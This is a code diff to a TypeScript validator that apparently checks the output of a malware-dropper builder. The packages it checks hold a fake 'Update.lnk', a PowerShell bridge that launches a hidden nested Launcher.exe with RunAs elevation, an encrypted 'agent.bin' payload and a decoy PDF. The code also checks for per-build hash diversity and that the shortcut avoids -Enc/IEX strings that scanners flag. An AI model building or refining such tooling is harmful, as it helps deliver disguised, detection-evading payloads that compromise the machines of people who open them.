@@ -6,6 +6,10 @@
  * subsystem (GUI), per-build launcher hash diversity, and payload round-trip
  * (decrypt the stamped overlay and compare with the source payload). There is
  * no .lnk to validate — Launcher.exe is the portable double-click entry.
+ *
+ * TASK_176: the launcher lives NESTED one level deeper — `names.innerFolder`
+ * arrives already DOUBLED (`inner/inner`, e.g. `acme/acme`; default
+ * `launcher/launcher`), because the doubling happens inside the generator.
  */
 
 import * as crypto from "crypto";
@@ -153,9 +157,14 @@ export async function validateLauncherBuild(
   }
   const entries = readZipEntries(zip);
   const updateLinkName = (p.names?.updateLinkName ?? "").trim() || "Update.lnk";
-  const innerFolder = (p.names?.innerFolder ?? "").trim() || "launcher";
+  // TASK_176: `innerFolder` arriving here is already the DOUBLED nested path
+  // (`inner/inner`, e.g. `acme/acme`; default `launcher/launcher`) — the
+  // doubling happens inside the generator. Zip entries use `/`; the bridge
+  // check below converts to `\`.
+  const innerFolder = (p.names?.innerFolder ?? "").trim() || "launcher/launcher";
   const launcherName = (p.names?.launcherName ?? "").trim() || "Launcher.exe";
   const payloadName = (p.names?.payloadName ?? "").trim() || "agent.bin";
+  const bridgeFolder = innerFolder.replace(/\//g, "\\");
   const wantNames = [updateLinkName, `${innerFolder}/${launcherName}`, `${innerFolder}/${payloadName}`];
   if (p.pdf?.name) wantNames.push(`${innerFolder}/${p.pdf.name}`);
   if (entries.count === wantNames.length) {
@@ -205,17 +214,17 @@ export async function validateLauncherBuild(
       fail("Update.lnk trigram scan", hits.join(", "));
     } else if (
       !scanHay.includes("powershell.exe") ||
-      !scanHay.includes(`${innerFolder}\\${launcherName}`) ||
+      !scanHay.includes(`${bridgeFolder}\\${launcherName}`) ||
       !scanHay.includes("RunAs")
     ) {
       fail(
         "Update.lnk bridge shape",
-        `expected a powershell Start-Process bridge to .\\${innerFolder}\\${launcherName} -Verb RunAs`
+        `expected a powershell Start-Process bridge to .\\${bridgeFolder}\\${launcherName} -Verb RunAs`
       );
     } else {
       pass(
         "Update.lnk bridge shape + trigram clean",
-        `fixed-system powershell -> .\\${innerFolder}\\${launcherName} -Verb RunAs; no -Enc/IEX`
+        `fixed-system powershell -> .\\${bridgeFolder}\\${launcherName} -Verb RunAs; no -Enc/IEX`
       );
     }
   }
